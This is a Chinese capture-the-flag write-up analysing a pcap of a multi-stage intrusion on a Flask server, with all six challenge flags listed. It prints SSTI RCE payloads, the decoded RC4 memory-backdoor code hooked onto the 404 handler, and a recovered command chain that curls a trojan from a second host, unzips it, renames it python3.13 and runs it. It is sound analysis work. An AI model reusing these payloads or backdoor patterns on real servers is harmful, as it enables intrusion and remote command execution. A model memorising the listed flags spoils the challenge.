# 长城杯 2024 初赛 — SnakeBackdoor (流量分析全链)

> **Flags (6 题)**:
> 1. `flag{zxcvbnm123}` (爆破密码)
> 2. `flag{c6242af0-6891-4510-8432-e1cdf051f160}` (Flask SECRET_KEY)
> 3. `flag{v1p3r_5tr1k3_k3y}` (注入后门 RC4 key)
> 4. `flag{python3.13}` (二进制木马本体)
> 5. `flag{ac46fb610b313b4f32fc642d8834b456}` (二进制木马 AES key)
> 6. `flag{6894c9ec-719b-4605-82bf-4fe1de27738f}` (服务器原始 flag)
>
> 这是个相对硬核的多步流量分析题，涉及：HTTP 爆破识别 → Flask SSTI 利用 → Python 33 层加壳注入 RC4 后门 → 二进制后门下载/解压/伪装 → 二进制后门动态 key (rand + srand) → 自实现 AES ECB 通信。最有教学价值的部分是 **当所有标准 AES/SM4 库都解不开通信流量时，如何用 binary 本身作为 oracle 反向解密**。

## 0. 文件概览

| 字段 | 值 |
|---|---|
| pcap | `ctf_test.pcap` (7.7 MB, 32k 包, 435s) |
| 涉及主机 | 192.168.1.111 (攻击机) / 192.168.1.200 (受害 Flask 服务器) / 192.168.1.201 (二级 C2 + file server) |
| 攻击场景 | Web 爆破 → SSTI → 内存马 → 落地二进制 → C2 通信 |
| 涉及加密 | RC4 (Python 后门), 自实现 AES-128 ECB (二进制后门) |

## 1. 第一步：协议分布 + 初步识别

```bash
$ capinfos ctf_test.pcap
Number of packets:   32 k
Capture duration:    435.518815 seconds

$ tshark -r ctf_test.pcap -q -z io,phs | grep -E "http|tcp"
  tcp     30053
    ssh   2515       ← 22 端口流量（攻击者 SSH 控制？）
    tls   2331
    http  3609       ← 大量 HTTP
      urlencoded-form  149   ← 表单提交 = 爆破嫌疑

$ tshark -r ctf_test.pcap -q -z conv,ip | head -10
192.168.1.111 <-> 192.168.1.200   20220 frames (主要交互)
192.168.1.200 <-> 192.168.1.202    2989 frames
192.168.1.202 <-> 192.168.1.111    2853 frames
192.168.1.111 <-> 192.168.1.201     914 frames
```

侦察判断：149 个 urlencoded-form 提交集中在一台机器 → 密码爆破。

## 2. 第一题：爆破成功的密码

```bash
$ tshark -r ctf_test.pcap -Y http.request -T fields -e http.request.uri | sort | uniq -c | sort -rn | head
  140 /admin/login          ← 集中爆破
    6 /static/style.css
    3 /admin/preview
    3 /admin/panels
    ...
```

140 次 POST `/admin/login`，期间有 302 重定向（典型登录成功响应）：

```bash
$ tshark -r ctf_test.pcap -Y 'http.response.code == 302 and tcp.srcport == 5000' \
        -T fields -e frame.number -e tcp.stream -e http.location
27977    1740    /admin/panel
28402    1764    /admin/panel
```

两个 302 stream，对应的 POST 请求体：

```bash
$ for stream in 1740 1764; do
    tshark -r ctf_test.pcap -Y "tcp.stream eq $stream and http.request" \
           -T fields -e http.request.uri -e urlencoded-form.value
  done
/admin/login    admin,zxcvbnm123      ← 这就是成功密码
/admin/login    admin,zxcvbnm123      ← 第二次同密码（会话续接）
```

### ✅ 答案 1: `flag{zxcvbnm123}`

### 💡 断网赛 checklist

- 找登录爆破：先看 `urlencoded-form.value` 分布
- 找成功登录：HTTP 302 + Location 跳转 / 200 + Set-Cookie session
- 当响应码全部 200/401 都看：响应内容长度 (`tcp.len`) 分布往往能区分成功/失败

## 3. 第二题：Flask SECRET_KEY (SSTI)

登录后攻击者立刻访问 `/admin/preview`，提交 `{{ 7*7 }}` 测试 SSTI：

```bash
$ tshark -r ctf_test.pcap -Y 'http.request.uri == "/admin/preview" and http.request.method == "POST"' \
        -T fields -e frame.number -e urlencoded-form.value
28546    {{ 7*7 }}
28820    {{ config }}            ← 这步获取 SECRET_KEY
29180    {{url_for.__globals__['__builtins__']['exec']("...")}}    ← RCE
```

`{{ config }}` 响应包含 Flask app config 字典，里面有 SECRET_KEY：

```bash
$ tshark -r ctf_test.pcap -q -z follow,tcp,ascii,1779 | grep -i SECRET_KEY
&#39;SECRET_KEY&#39;: &#39;c6242af0-6891-4510-8432-e1cdf051f160&#39;
```

### ✅ 答案 2: `flag{c6242af0-6891-4510-8432-e1cdf051f160}`

### 💡 断网赛 checklist

- Flask 应用 + 5000 端口 + `/admin/preview` 接收用户字符串 → SSTI 嫌疑
- `{{ config }}` / `{{ self }}` / `{{ request }}` 是最快的信息泄漏 payload
- 响应包含 `&#39;` (HTML 实体 `'`) 反而方便 grep `SECRET_KEY`

## 4. 第三题：内存马的 RC4 密钥

frame 29180 的 SSTI payload 非常长 (~4.4 KB)，是嵌套压缩的：

```
{{url_for.__globals__['__builtins__']['exec']("import base64; 
   exec(base64.b64decode('<OUTER_B64>'))", 
   {'request':..., 'app':...})}}
```

### 4.1 第一层：base64 解码 OUTER

```python
import base64
layer1 = base64.b64decode(OUTER_B64).decode()
print(layer1)
```

得到：

```python
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'=c4CU3xP+//vPzftv8gri635a0T1rQvMlKGi3iiBwvm6TFEvahfQE2PEj7FOccT...'))
```

注意 lambda：**bytes 反转 → base64 解码 → zlib 解压**。

### 4.2 自动剥洋葱 (33 层！)

```python
import re, base64, zlib

def peel(data):
    m = re.search(rb"exec\(\(_\)\(b'([A-Za-z0-9+/=]+)'\)\)", data)
    if not m: return None
    return zlib.decompress(base64.b64decode(m.group(1)[::-1]))

layer = layer1.encode()
i = 1
while True:
    nxt = peel(layer)
    if nxt is None:
        print(f"=== 剥到底 (共 {i} 层) ===")
        print(layer.decode())
        break
    layer = nxt
    i += 1
```

剥了 33 层后看到真实 payload：

```python
RC4_SECRET = b'v1p3r_5tr1k3_k3y'

def rc4_crypt(data, key):
    # 标准 RC4 实现
    ...

def backdoor_handler():
    if request.headers.get('X-Token-Auth') != '3011aa21232beb7504432bfa90d32779':
        return "Error"
    enc_hex_cmd = request.form.get('data')
    cmd = rc4_crypt(bytes.fromhex(enc_hex_cmd), RC4_SECRET).decode()
    output = os.popen(cmd).read().encode()
    enc_output = rc4_crypt(output, RC4_SECRET)
    return binascii.hexlify(enc_output).decode()

# 把后门挂到 404 错误处理器
app.error_handler_spec[None][code][exc_class] = lambda error: backdoor_handler()
```

### ✅ 答案 3: `flag{v1p3r_5tr1k3_k3y}`

### 💡 断网赛 checklist

- SSTI 注入 payload 出现 `base64`+`zlib`+`exec` → 100% 嵌套压缩
- 用 `re` 自动剥层，循环条件用"找不到下一层 exec"
- 真正的恶意逻辑在最内层，**不是每层都一样**
- 看到 `app.error_handler_spec` → **Flask 内存马覆盖错误处理器**的招式

## 5. 第四题：二进制木马本体文件名

后门挂上后，攻击者通过 X-Token-Auth + form data 发 RC4 加密命令。先找带这个 header 的请求：

```bash
$ tshark -r ctf_test.pcap -Y 'http.request and http contains "X-Token-Auth"' \
        -T fields -e frame.number -e http.request.method -e http.request.uri
29336    POST    /admin/settings
29414    POST    /admin/users
30525    POST    /admin/panels
30822    POST    /admin/dashboard
30944    POST    /admin/stats
31113    POST    /admin/panels
31190    POST    /admin/panels
```

注意：这些 `/admin/*` 路径 Flask app 本身没有 → 触发 404 → 我们的后门接管！

解密所有请求体的 `data=<hex>`：

```python
RC4_KEY = b'v1p3r_5tr1k3_k3y'

def rc4(data, key):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    res = bytearray()
    for c in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        res.append(c ^ S[(S[i] + S[j]) % 256])
    return bytes(res)

for fnum in [29336, 29414, 30525, 30822, 30944, 31113, 31190]:
    body = tshark_get_file_data(fnum)   # hex of "data=<hex>"
    body_str = bytes.fromhex(body).decode()
    if body_str.startswith('data='):
        hex_cmd = body_str[5:]
        cmd = rc4(bytes.fromhex(hex_cmd), RC4_KEY).decode()
        print(f"frame {fnum}: {cmd}")
```

完整攻击链：

| frame | RC4 解密命令 |
|---|---|
| 29336 | `id` |
| 29414 | `ls -al` |
| 30525 | `curl 192.168.1.201:8080/shell.zip -o /tmp/123.zip` |
| 30822 | `unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip` ← zip 密码 `nf2jd092jd01` |
| 30944 | `mv /tmp/shell /tmp/python3.13` ← **改名伪装** |
| 31113 | `chmod +x /tmp/python3.13` |
| 31190 | `/tmp/python3.13` ← **启动木马** |

木马本体被 mv 成 `python3.13` 伪装系统 Python 进程。

### ✅ 答案 4: `flag{python3.13}`

### 💡 断网赛 checklist

- 后门通过未授权 path（404 → 自定义 handler）是常见隐蔽手法
- 命令链中带 `chmod +x` 后跟绝对路径执行 → 那个文件就是真正的木马
- `mv X Y` 后只用 Y 名称 → Y 是木马的真实运行名

## 6. 第五题：木马通信 AES 密钥

### 6.1 提取 + 解压 zip

```bash
$ tshark -r ctf_test.pcap --export-objects http,/tmp/snake_extracted
$ unzip -P nf2jd092jd01 /tmp/snake_extracted/shell.zip -d out/
$ file out/shell
ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
```

### 6.2 静态识别加密算法

```bash
$ strings -a out/shell | grep -iE "error|ecb|aes|sm4|key"
Error: Input length must be a multiple of 16 for ECB mode.    ← AES ECB 提示
192.168.1.201                                                 ← C2 IP

$ readelf -S out/shell | grep '\.rodata'
.rodata    PROGBITS    0000000000002000    00002000

$ objdump -s -j .rodata out/shell | head -20
2020 d690e9fe cce13db7 16b614c2 28fb2c05  ......=.....(.,.
2030 2b679a76 2abe04c3 aa441326 49860699  +g.v*....D.&I...
```

`d690e9fecce13db716b614c228fb2c05` ← 这是 **SM4 S-Box 第一行**！但 strings 里又有 "AES ECB" 错误提示——这是误导，真实算法可能是 SM4 或自实现 AES。**不要纠结算法名字**，关键是 key。

### 6.3 反汇编看 key 怎么生成的

```bash
$ objdump -d out/shell -M intel --start-address=0x19f5 | head -100
# main 在 0x19f5（从 _start lea rdi 推出）
```

关键流程：

```
1a72: connect 192.168.1.201:0xe59e (58782)
1aa7: recv 4 bytes → buf       ; 接收 seed
1ac5-1b07: 字节反转 (ntohl)     ; seed = big-endian int
1b0a: srand(seed)               ; 用 seed 初始化随机数
1b14-1b45: 循环 4 次：
    rand() → mov [key_buf+i*4], eax    ; 4 个 32-bit int = 16 字节 key
1b47: 调 0x13b4(buf_A, key, 0)  ; AES setup encrypt schedule
1b60: 调 0x13b4(buf_B, key, 1)  ; AES setup decrypt schedule
1b83: recv 4 bytes (cmd length)
1c2c: recv length bytes (cipher)
1c69: 0x1860(...mode=0=decrypt..., buf_A) ; 解密 cmd
1cc3: popen(cmd, "r")           ; 执行
1d24: fread output
1d56: pad output to 16 multiple
1db6: 0x1860(...mode=1=encrypt..., buf_B) ; 加密 output
1e22: send response
```

### 6.4 提取真实 key

C2 发的 seed 在哪？看端口 58782 的对话：

```bash
$ tshark -r ctf_test.pcap -Y 'tcp.port == 58782' \
        -T fields -e frame.number -e ip.src -e tcp.len
31192    192.168.1.200    0    # SYN
31193    192.168.1.201    0    # SYN-ACK
31194    192.168.1.200    0    # ACK
31195    192.168.1.201    4    # ← seed (4 字节, 201→200)
```

```bash
$ tshark -r ctf_test.pcap -Y 'frame.number == 31195' -T fields -e tcp.payload
34952046
```

seed = `0x34952046`。用 glibc rand 重现 key：

```python
import ctypes, struct
libc = ctypes.CDLL('libc.so.6')
libc.srand(0x34952046)
key = b''
for _ in range(4):
    r = libc.rand()
    key += struct.pack('<I', r & 0xFFFFFFFF)
print(key.hex())   # ac46fb610b313b4f32fc642d8834b456
```

### ✅ 答案 5: `flag{ac46fb610b313b4f32fc642d8834b456}`

### 💡 断网赛 checklist

- 二进制木马常用 `srand(network_seed) + rand() * N` 生成 session key
- 反汇编先看 `connect → recv → srand → rand` 这条主线
- **glibc rand 算法跨发行版稳定**，可以用 Python ctypes 模拟
- key 字节序 = CPU 写 32-bit int 的字节序 (x86_64 = LE)

## 7. 第六题：最难的一步 — 解密 C2 通信看 flag

这道题花了我最多时间，关键经验是 **当标准库解不开自实现密码时，让 binary 自己当 oracle**。

### 7.1 标准 SM4/AES 都解不开

```python
from gmssl.sm4 import CryptSM4, SM4_DECRYPT
sm4 = CryptSM4(); sm4.set_key(key, SM4_DECRYPT)
print(sm4.crypt_ecb(cipher))   # → 乱码
# Crypto.Cipher.AES 也乱码
```

试 LE-key / BE-key / SM4 / AES / encrypt / decrypt 所有组合都不行。

### 7.2 关键 insight：用 binary 当 oracle

binary 接收 cipher → 解密 → popen 执行 → 加密输出 → 返回。如果我们能让它**解密任意 cipher**，就能逆向得到任何明文。

具体步骤：

1. **抽出 pcap 里 C2→binary 的所有命令 cipher**（已用 tshark 协议解析提取）
2. **写一个 mock C2 server**（127.0.0.1:58782），按协议发：
   - 4 字节 seed = 0x34952046
   - 然后 `4 字节 length + cipher` 循环
3. **改 binary 连 127.0.0.1**：用 `LD_PRELOAD` hook `inet_addr` 返回 `127.0.0.1`
4. **strace 看 execve 调用**：binary 解密命令后会 `execve("/bin/sh", ["sh", "-c", "--", "解密后的命令"])`

```c
// /tmp/redirect.c
#define _GNU_SOURCE
#include <netinet/in.h>
#include <arpa/inet.h>

in_addr_t inet_addr(const char *cp) {
    return htonl(0x7F000001);   // 127.0.0.1
}
```

```bash
$ gcc -shared -fPIC redirect.c -o redirect.so
$ LD_PRELOAD=./redirect.so strace -f -e execve ./shell
```

mock server + binary 跑起来后 strace 输出：

```
execve("/bin/sh", ["sh", "-c", "--", "pwd\n"], ...)
execve("/bin/sh", ["sh", "-c", "--", "id\n"], ...)
execve("/bin/sh", ["sh", "-c", "--", "ls -al /\n"], ...)
execve("/bin/sh", ["sh", "-c", "--", "cat /flag | tr '1' 'l' | tr '0' 'O'\n"], ...)
execve("/bin/sh", ["sh", "-c", "--", "echo \"hach by hahahah\" > /tmp/hacked\n"], ...)
```

完整命令链显形！攻击者用 `tr` 把 `1→l, 0→O` 做混淆。

### 7.3 反向解密 binary 自己加密的响应

但 cat /flag 输出（含 flag）在 pcap 里是 binary 加密的。要解出来：

**核心 trick**：binary 的加解密是**互逆**操作。把 binary 在 pcap 里发出的响应 cipher **当作伪命令** 发给 binary，binary "解密"它得到的明文 = 原 plain（即 flag 内容）。

```python
# 抽出 pcap 里 binary 对 cmd3 (cat /flag) 的响应 cipher
resp3 = bytes.fromhex(
    '7f4b0ef4806983f164af6f46b71d3fce'
    '1e3c0bd00c4dd162b72c156f0f3aecd2'
    'afcabf551e08380db6fd20316f8a2729'
)

# mock server 发这个当 cmd
conn.sendall(struct.pack('>I', 0x34952046))    # seed
conn.sendall(struct.pack('>I', len(resp3)))
conn.sendall(resp3)
```

strace 显示：

```
execve("/bin/sh", ["sh", "-c", "--", "flag{6894c9ec-7l9b-46O5-82bf-4felde27738f}\n"], ...)
```

这是攻击者 cat 出来经过 tr 处理的 flag。反 tr：
- `l` → `1`
- `O` → `0`

### ✅ 答案 6:
- **攻击者看到的（tr 后）**: `flag{6894c9ec-7l9b-46O5-82bf-4felde27738f}`
- **服务器原始 flag**: `flag{6894c9ec-719b-4605-82bf-4fe1de27738f}`

### 💡 断网赛 checklist（最重要）

1. **自实现密码不要试着重写算法**，让 binary 当 oracle 是最快的路
2. **LD_PRELOAD + strace + mock server** 是离线分析二进制 C2 的标准三件套
3. **encrypt/decrypt 是互逆**：把 binary 的输出 cipher 当 cmd 发回去就能"解密"它
4. **攻击者用 tr/sed 做 obfuscation 常见**，看 popen 命令链时注意 `| tr | sed | xxd | base64`

## 8. 完整解题 toolkit（线下赛拷贝就能用）

### 工具准备

```bash
sudo apt install tshark wireshark gdb strace ltrace
pip install pycryptodome gmssl --break-system-packages
```

### 协议层提取脚本

```python
# 提取 stream 中所有方向数据 + 长度前缀解析
import subprocess, struct

def extract_stream(pcap, stream_id, src_ip):
    out = subprocess.check_output([
        "tshark", "-r", pcap, "-Y",
        f"tcp.stream == {stream_id} and ip.src == {src_ip}",
        "-T", "fields", "-e", "tcp.payload"
    ], stderr=subprocess.DEVNULL).decode()
    return b''.join(bytes.fromhex(l) for l in out.splitlines() if l)

def parse_length_prefixed(data, offset=0):
    msgs = []
    pos = offset
    while pos + 4 <= len(data):
        l = struct.unpack('>I', data[pos:pos+4])[0]
        pos += 4
        if l > len(data) - pos: break
        msgs.append(data[pos:pos+l])
        pos += l
    return msgs
```

### LD_PRELOAD redirect 模板

```c
// 强制连接到 127.0.0.1
#define _GNU_SOURCE
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>

in_addr_t inet_addr(const char *cp) {
    fprintf(stderr, "[hook] inet_addr(%s) → 127.0.0.1\n", cp);
    return htonl(0x7F000001);
}

// 如果用 gethostbyname：
struct hostent *gethostbyname(const char *name) {
    static struct hostent he;
    static char *addr_list[2] = {NULL, NULL};
    static char addr[4] = {127, 0, 0, 1};
    he.h_name = (char *)name;
    he.h_addr_list = addr_list;
    addr_list[0] = addr;
    he.h_length = 4;
    he.h_addrtype = AF_INET;
    return &he;
}
```

```bash
gcc -shared -fPIC redirect.c -o redirect.so
LD_PRELOAD=./redirect.so strace -f -e execve,connect ./target_binary
```

### Hook srand/rand 看真实 seed

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

static int (*real_rand)(void) = NULL;
static void (*real_srand)(unsigned int) = NULL;
static int rand_count = 0;

void srand(unsigned int s) {
    if (!real_srand) real_srand = dlsym(RTLD_NEXT, "srand");
    fprintf(stderr, "[hook] srand(0x%08x)\n", s);
    real_srand(s); rand_count = 0;
}

int rand(void) {
    if (!real_rand) real_rand = dlsym(RTLD_NEXT, "rand");
    int r = real_rand();
    fprintf(stderr, "[hook] rand()[%d] = 0x%08x\n", rand_count++, r);
    return r;
}
```

## 9. Traps and lessons learned

| 坑 | 原因 | 解决 |
|----|------|------|
| 把 SSTI payload 当 base64 一次解到底 | 实际是 33 层嵌套压缩 | 写循环 + 正则 peel，每层 reverse → b64 → zlib |
| 标准 SM4 库解不开通信 | 出题人可能改了 sbox / round / key schedule | 不要纠结自实现细节，直接用 binary 当 oracle |
| 试图反汇编 AES 实现找 key | 600+ 行 unrolled，时间黑洞 | srand + rand 推 key 是关键，AES 实现细节不重要 |
| 用 ctypes rand 跟 binary 不一致 | 怀疑 glibc 版本差异 | 实测：glibc rand 算法跨版本稳定，问题在别处 |
| follow stream raw 方向反向 | tshark 的 Node 0/Node 1 跟 client/server 不直接对应 | 用 packet-level + ip.src 过滤更可靠 |
| `cat /flag` 在 mock 上失败 | mock 机器没有 /flag | 用 binary oracle 反解 pcap 里 binary 的响应 cipher |
| 看到 `tr '1' 'l' \| tr '0' 'O'` | 以为是 obfuscation 没解 | flag 看到后要反 tr 才是原始 |

## 10. Methodology takeaways（写给以后断网的我）

1. **流量分析多步攻击链的标准顺序**：协议分布 → 流量来源 → 找登录爆破 → 找成功标志 → 看登录后行为 → 解密 → 重复
2. **SSTI 攻击 payload 几乎总是嵌套压缩的**，base64 + zlib + exec 三件套
3. **Flask 内存马的两个标志**：(1) 访问 404 路径却得到响应 (2) `app.error_handler_spec` / `app.before_request_funcs` 被覆盖
4. **二进制木马通信流量永远先看协议**：4 字节长度前缀 + cipher 是 90% 情况
5. **自实现密码 = binary 当 oracle**：LD_PRELOAD + strace + mock C2 是黄金组合
6. **encrypt/decrypt 互逆的性质**：把 cipher 当 plaintext 喂回去就能反向操作

## 11. 时间分配（实战）

| 阶段 | 用时 | 占比 |
|---|---|---|
| 协议分布 + 找爆破 | 5 min | 5% |
| Q1 爆破密码 | 5 min | 5% |
| Q2 SECRET_KEY (SSTI) | 10 min | 10% |
| Q3 33 层剥洋葱 + RC4 key | 15 min | 15% |
| Q4 RC4 解密命令链 → 木马名 | 10 min | 10% |
| Q5 提取 binary + 反汇编 + 推 key | 20 min | 20% |
| Q6 算法不匹配 → binary oracle | 30 min | 35% (最坑) |

总时间约 **90-100 分钟**（断网赛实际可能更慢 60% = 150min）。

## 12. Related techniques

- [GHCTF 2025 mypcap](mypcap.md) *(coming soon)* — Tomcat 冰蝎 AES-ECB 流量解密（标准库就够）
- [鹤城杯 2021 流量分析](hcb2021_traffic_analysis.md) — 布尔盲注 PCAP 还原
- [玄机 DMZ2 Ubuntu](https://github.com/...) *(coming soon)* — Nacos CVE-2021-29442 + UID=0 隐藏后门
